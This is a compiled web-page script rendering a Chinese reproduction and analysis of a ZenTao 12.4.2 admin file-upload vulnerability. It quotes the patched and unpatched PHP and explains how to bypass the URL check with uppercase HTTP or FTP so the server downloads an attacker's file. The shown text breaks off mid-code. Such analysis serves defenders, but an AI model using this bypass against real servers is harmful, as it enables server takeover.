(window.webpackJsonp=window.webpackJsonp||[]).push([[10],{1021:function(s,t,a){s.exports=a.p+"assets/img/zentao-1-20220313232509623.af43f305.png"},1022:function(s,t,a){s.exports=a.p+"assets/img/zentao-14.18b0d31d.png"},1023:function(s,t,a){s.exports=a.p+"assets/img/zentao-2.3e13411e.png"},1024:function(s,t,a){s.exports=a.p+"assets/img/zentao-4.a6b299f9.png"},1025:function(s,t,a){s.exports=a.p+"assets/img/zentao-6.6587ec7c.png"},1026:function(s,t,a){s.exports=a.p+"assets/img/zentao-5.3feda7aa.png"},1027:function(s,t,a){s.exports=a.p+"assets/img/zentao-3.fb6d3ce4.png"},1028:function(s,t,a){s.exports=a.p+"assets/img/zentao-7.221c6b8a.png"},1029:function(s,t,a){s.exports=a.p+"assets/img/zentao-8.491245bc.png"},1030:function(s,t,a){s.exports=a.p+"assets/img/zentao-9.72a086a5.png"},1031:function(s,t,a){s.exports=a.p+"assets/img/zentao-10.fb0e4e3a.png"},2106:function(s,t,a){"use strict";a.r(t);var n=a(75),e=Object(n.a)({},(function(){var s=this,t=s.$createElement,n=s._self._c||t;return n("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[n("h1",{attrs:{id:"禅道-12-4-2-后台任意文件上传漏洞-cnvd-c-2020-121325"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#禅道-12-4-2-后台任意文件上传漏洞-cnvd-c-2020-121325"}},[s._v("#")]),s._v(" 禅道 12.4.2 后台任意文件上传漏洞 CNVD-C-2020-121325")]),s._v(" "),n("h2",{attrs:{id:"漏洞描述"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),n("p",[s._v("百度云安全团队监测到禅道官方发布了文件上传漏洞的风险通告，该漏洞编号为CNVD-C-2020-121325，漏洞影响禅道<=12.4.2版本。登陆管理后台的恶意攻击者可以通过fopen/fread/fwrite方法读取或上传任意文件，成功利用此漏洞可以读取目标系统敏感文件或获得系统管理权限。我们对漏洞进行了复现和分析，由于需要登录后台才可以利用，实际风险相对较低，建议受影响的禅道用户尽快升级到最新版。")]),s._v(" "),n("h2",{attrs:{id:"影响版本"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#影响版本"}},[s._v("#")]),s._v(" 影响版本")]),s._v(" "),n("a-checkbox",{attrs:{checked:""}},[s._v("禅道 <= 12.4.2版本")]),n("br"),s._v(" "),n("h2",{attrs:{id:"环境搭建"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#环境搭建"}},[s._v("#")]),s._v(" 环境搭建")]),s._v(" "),n("p",[n("img",{attrs:{src:a(1021),alt:"img"}})]),s._v(" "),n("p",[s._v("调用接口查询版本信息")]),s._v(" "),n("div",{staticClass:"language-plain line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-plain"}},[n("code",[s._v("  http://xxx.xxx.xxx.xxx/www/index.php?mode=getconfig\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br")])]),n("p",[n("img",{attrs:{src:a(1022),alt:"img"}})]),s._v(" "),n("h2",{attrs:{id:"漏洞复现"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),n("ul",[n("li",[s._v("✅漏洞触发需要后台权限")])]),s._v(" "),n("p",[s._v("根据漏洞描述查看修改后的代码片段")]),s._v(" "),n("p",[n("img",{attrs:{src:a(1023),alt:"img"}})]),s._v(" "),n("p",[n("strong",[s._v("修改前")])]),s._v(" "),n("div",{staticClass:"language-php line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-php"}},[n("code",[n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("public")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("function")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function-definition function"}},[s._v("downloadZipPackage")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$version")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$link")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$decodeLink")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token class-name static-context"}},[s._v("helper")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("::")]),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("safe64Decode")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$link")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("preg_match")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'/^https?\\:\\/\\//'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$decodeLink")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("return")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token constant boolean"}},[s._v("false")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("return")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token keyword static-context"}},[s._v("parent")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("::")]),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("downloadZipPackage")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$version")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$link")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br")])]),n("p",[n("strong",[s._v("修改后")])]),s._v(" "),n("div",{staticClass:"language-php line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-php"}},[n("code",[n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("public")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("function")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function-definition function"}},[s._v("downloadZipPackage")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$version")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$link")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$decodeLink")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token class-name static-context"}},[s._v("helper")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("::")]),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("safe64Decode")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$link")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("preg_match")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'/^https?\\:\\/\\//'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$decodeLink")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("return")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token constant boolean"}},[s._v("false")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n    "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$file")]),s._v("      "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("basename")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$link")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$extension")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("substr")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$file")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("strrpos")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$file")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'.'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("strpos")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('",'),n("span",{pre:!0,attrs:{class:"token interpolation"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$this")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),n("span",{pre:!0,attrs:{class:"token property"}},[s._v("config")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),n("span",{pre:!0,attrs:{class:"token property"}},[s._v("file")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),n("span",{pre:!0,attrs:{class:"token property"}},[s._v("allowed")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")])]),s._v(',"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('",'),n("span",{pre:!0,attrs:{class:"token interpolation"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$extension")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")])]),s._v(',"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("===")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token constant boolean"}},[s._v("false")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("return")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token constant boolean"}},[s._v("false")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("return")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token keyword static-context"}},[s._v("parent")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("::")]),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("downloadZipPackage")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$version")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$link")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br")])]),n("p",[s._v("这里传入的参数为版本和link地址，然后base64解码，正则判断是否为"),n("strong",[s._v("http")]),s._v("或"),n("strong",[s._v("https")]),s._v("协议，这里的正则过滤并不完整，所以可以绕过用于下载恶意文件")]),s._v(" "),n("p",[n("img",{attrs:{src:a(1024),alt:"img"}})]),s._v(" "),n("p",[s._v("可以大写"),n("strong",[s._v("http")]),s._v("或请求"),n("strong",[s._v("FTP")]),s._v("来绕过正则")]),s._v(" "),n("p",[n("img",{attrs:{src:a(1025),alt:"img"}})]),s._v(" "),n("p",[n("img",{attrs:{src:a(1026),alt:"img"}})]),s._v(" "),n("p",[s._v("跟进一下"),n("strong",[s._v("parent::downloadZipPackage")]),s._v("这个方法，跟着来到"),n("strong",[s._v("zentao\\module\\client\\model.php")]),s._v("文件中")]),s._v(" "),n("p",[n("img",{attrs:{src:a(1027),alt:"img"}})]),s._v(" "),n("div",{staticClass:"language-php line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-php"}},[n("code",[n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("public")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("function")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function-definition function"}},[s._v("downloadZipPackage")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$version")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$link")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("ignore_user_abort")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token constant boolean"}},[s._v("true")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("set_time_limit")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("empty")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$version")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("||")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("empty")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$link")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("return")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token constant boolean"}},[s._v("false")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$dir")]),s._v("  "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"data/client/"')]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$version")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'/'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$link")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token class-name static-context"}},[s._v("helper")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("::")]),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("safe64Decode")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$link")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$file")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("basename")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$link")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("is_dir")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$this")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),n("span",{pre:!0,attrs:{class:"token property"}},[s._v("app")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),n("span",{pre:!0,attrs:{class:"token property"}},[s._v("wwwRoot")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$dir")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n            "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("mkdir")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$this")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),n("span",{pre:!0,attrs:{class:"token property"}},[s._v("app")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),n("span",{pre:!0,attrs:{class:"token property"}},[s._v("wwwRoot")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$dir")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0755")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token constant boolean"}},[s._v("true")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("is_dir")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$this")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),n("span",{pre:!0,attrs:{class:"token property"}},[s._v("app")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),n("span",{pre:!0,attrs:{class:"token property"}},[s._v("wwwRoot")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$dir")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("return")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token constant boolean"}},[s._v("false")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("file_exists")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$this")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),n("span",{pre:!0,attrs:{class:"token property"}},[s._v("app")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),n("span",{pre:!0,attrs:{class:"token property"}},[s._v("wwwRoot")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$dir")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$file")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n            "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("return")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token class-name static-context"}},[s._v("commonModel")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("::")]),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("getSysURL")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$this")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),n("span",{pre:!0,attrs:{class:"token property"}},[s._v("config")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),n("span",{pre:!0,attrs:{class:"token property"}},[s._v("webRoot")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$dir")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$file")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("ob_clean")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("ob_end_flush")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n        "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$local")]),s._v("  "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("fopen")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$this")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),n("span",{pre:!0,attrs:{class:"token property"}},[s._v("app")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),n("span",{pre:!0,attrs:{class:"token property"}},[s._v("wwwRoot")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$dir")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$file")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'w'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$remote")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("fopen")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$link")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'rb'")]),n("span",{pre:!0,attrs:{class:"token 